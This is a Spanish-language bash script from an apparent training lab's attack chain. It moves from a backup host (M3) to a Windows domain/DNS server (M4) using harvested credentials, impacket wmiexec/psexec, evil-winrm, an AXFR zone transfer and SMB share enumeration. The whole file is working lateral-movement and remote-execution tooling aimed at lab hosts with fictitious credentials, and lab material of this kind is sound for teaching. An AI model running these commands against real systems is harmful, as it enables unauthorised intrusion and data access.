#!/usr/bin/env bash
# ============================================================================
#  lab/chain/04-m3-to-m4.sh — salto 4: M3 (backups) → M4 (Windows, DNS)
# ----------------------------------------------------------------------------
#  Con las credenciales que dejó M3 en /srv/storage/backups/credenciales.txt:
#    · ejecución remota en M4 con impacket (wmiexec / psexec)
#    · shell WinRM con evil-winrm
#    · AXFR de la zona uni.lab (DNS autoritativo en M4)
#    · enumeración del share Transfer
#
#  Los comandos se ejecutan "desde M3" (posición real en la cadena). Si M3 no
#  tiene la herramienta, se avisa y se usa M6, que en este laboratorio está en
#  la misma LAN plana 10.10.10.0/24.
#
#  Uso:
#    bash lab/chain/04-m3-to-m4.sh            # imprime
#    bash lab/chain/04-m3-to-m4.sh --run      # ejecuta lo que haya disponible
#
#  Credenciales de laboratorio (lab/README.md §6), datos ficticios.
# ============================================================================

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_ARTIFACTS="${LAB_ARTIFACTS:-$LAB_REPO_DIR/artifacts}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_ARTIFACTS LAB_LOG

# shellcheck source=../common/lib.sh
. "$HERE/../common/lib.sh"

LAB_ROLE=chain

RUN=0
M3_SSH_USER="${M3_SSH_USER:-rony123}"
M3_SSH_PASS="${M3_SSH_PASS:-rony123}"
M3_BACKUP_USER="${M3_BACKUP_USER:-backup}"
TMPKEY="${LAB_TMPKEY:-${TMPDIR:-/tmp}/id_m2_ed25519}"
EXPORT="${M3_EXPORT:-/srv/storage/backups}"

M4_USER="${M4_USER:-Administrador}"
M4_PASS="${M4_PASS:-M4_Admin_2026!}"
M4_SHARE="${M4_SHARE:-Transfer}"
M4_DOMAIN="${M4_DOMAIN:-uni.lab}"

usage() {
  cat <<'EOF'
Uso: bash lab/chain/04-m3-to-m4.sh [opciones]

  --run        ejecutar (def. solo imprime)
  -h, --help   esta ayuda

Variables útiles:
  M4_USER / M4_PASS   cuenta de M4 (las de credenciales.txt)
  M4_SHARE            share a enumerar (def. Transfer)
EOF
}

while (($#)); do
  case "$1" in
    --run)     RUN=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "opción desconocida: $1 (ver --help)" ;;
  esac
done

need_ssh() { command -v sshpass >/dev/null 2>&1 || return 1; }

# Prefiere la llave de M2 (la del salto 3); si no está, usa la cuenta de gestión.
ssh_m3() {
  if [[ -s "$TMPKEY" ]]; then
    ssh -i "$TMPKEY" -o IdentitiesOnly=yes -o BatchMode=yes \
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
      "$M3_BACKUP_USER@$M3" "$1"
  elif need_ssh; then
    sshpass -p "$M3_SSH_PASS" ssh \
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
      "$M3_SSH_USER@$M3" "$1"
  else
    return 1
  fi
}

on_m3_or_local() {
  # $1 = descripción, $2 = comando; intenta en M3 y si no, en M6 (LAN plana).
  local desc="$1" cmd="$2"
  if ssh_m3 "$cmd" 2>/dev/null; then
    return 0
  fi
  warn "$desc: no se ejecutó en M3 (sin acceso ssh o sin la herramienta); se intenta desde M6"
  bash -c "$cmd"
}

# --------------------------------------------------------------- objetivo
lab_banner
step "salto 4 · M3 (${M3}) → M4 (${M4}, Windows Server 2016)"
cat <<EOF
Objetivo: de "puedo leer respaldos" a "ejecuto en el servidor de dominio".

  a) credenciales   → $EXPORT/credenciales.txt  ($M4_USER)
  b) ejecución      → impacket wmiexec/psexec (SMB 445)
  c) consola        → evil-winrm (5985)
  d) DNS            → AXFR de $M4_DOMAIN contra $M4
  e) share          → //$M4/$M4_SHARE (share del escenario)

  M4 es el pivote lógico hacia M5: DNS + share con las claves del cliente.
EOF

# --------------------------------------------------------------- comandos
step "comandos exactos (desde M3)"
cat <<EOF
  # a) el secreto que dejó el salto 3
  cat $EXPORT/credenciales.txt

  # b) ejecución remota con impacket (usar la clave del archivo)
  impacket-wmiexec.py '$M4_USER:$M4_PASS@$M4' 'whoami'
  impacket-psexec.py  '$M4_USER:$M4_PASS@$M4' 'whoami'

  # c) WinRM interactivo
  evil-winrm -i $M4 -u '$M4_USER' -p '$M4_PASS'

  # d) transferencia de zona (mal configurada a propósito)
  dig axfr $M4_DOMAIN @$M4 +short
  dig +short pc-est01.$M4_DOMAIN @$M4

  # e) enumeración del share Transfer
  smbclient -L //$M4 -U '$M4_USER%$M4_PASS'
  smbclient //$M4/$M4_SHARE -U '$M4_USER%$M4_PASS' \\
    -c 'recurse ON; prompt OFF; ls'
  # descarga selectiva (evidencia): -c 'recurse ON; prompt OFF; mget *'
EOF

if (( RUN == 0 )); then
  step "modo impresión"
  printf '  Sin --run no se ejecuta nada. Para ejecutar: --run\n' >&2
  exit 0
fi

# --------------------------------------------------------------- ejecución
step "a) credenciales desde M3"
creds="$(ssh_m3 "cat $EXPORT/credenciales.txt" 2>/dev/null || true)"
if [[ -n "$creds" ]]; then
  printf '%s\n' "$creds"
  ok "credenciales leídas de M3"
else
  warn "no se pudo leer $EXPORT/credenciales.txt en M3; se usan las de lab/README.md"
fi

step "b) ejecución remota en M4 (impacket)"
if command -v impacket-wmiexec.py >/dev/null 2>&1; then
  impacket-wmiexec.py "$M4_USER:$M4_PASS@$M4" 'whoami' \
    || warn "wmiexec falló (¿445/135 abiertos? ¿credenciales vigentes?)"
elif command -v wmiexec.py >/dev/null 2>&1; then
  wmiexec.py "$M4_USER:$M4_PASS@$M4" 'whoami' \
    || warn "wmiexec falló"
else
  warn "sin impacket en M6: sudo apt-get install -y python3-impacket"
fi

if command -v impacket-psexec.py >/dev/null 2>&1; then
  step "b2) psexec (crea servicio; deja rastro, usar sólo si wmiexec falla)"
  impacket-psexec.py "$M4_USER:$M4_PASS@$M4" 'whoami' \
    || warn "psexec falló (normal si el servicio no puede crearse)"
else
  warn "sin impacket-psexec.py (opcional)"
fi

step "c) WinRM (evil-winrm)"
if command -v evil-winrm >/dev/null 2>&1; then
  timeout 60 evil-winrm -i "$M4" -u "$M4_USER" -p "$M4_PASS" -c whoami \
    || warn "evil-winrm falló (¿5985? ¿WinRM habilitado?)"
else
  warn "sin evil-winrm: sudo apt-get install -y evil-winrm"
fi

step "d) AXFR de $M4_DOMAIN"
on_m3_or_local "dig" "dig axfr $M4_DOMAIN @$M4 +short" || warn "AXFR rechazado o DNS caído"
printf '\n  pc-est01:\n' >&2
on_m3_or_local "dig" "dig +short pc-est01.$M4_DOMAIN @$M4" || true

step "e) share $M4_SHARE en $M4"
if command -v smbclient >/dev/null 2>&1; then
  smbclient -L "//$M4" -U "$M4_USER%$M4_PASS" -m SMB3 2>/dev/null \
    || warn "no se pudo listar shares (¿445? ¿SMB1/SMB2?)"
  printf '\n  contenido de //%s/%s:\n' "$M4" "$M4_SHARE" >&2
  smbclient "//$M4/$M4_SHARE" -U "$M4_USER%$M4_PASS" -m SMB3 \
    -c 'recurse ON; prompt OFF; ls' 2>/dev/null \
    || warn "no se pudo abrir el share $M4_SHARE"
else
  warn "sin smbclient: sudo apt-get install -y smbclient"
fi

if command -v nxc >/dev/null 2>&1; then
  step "e2) alternativa con nxc"
  nxc smb "$M4" -u "$M4_USER" -p "$M4_PASS" --shares \
    || warn "nxc falló"
fi

step "siguiente salto"
printf '  con firma SMB/AXFR y el share Transfer → bash %s/05-m4-to-m5.sh\n' "$HERE" >&2
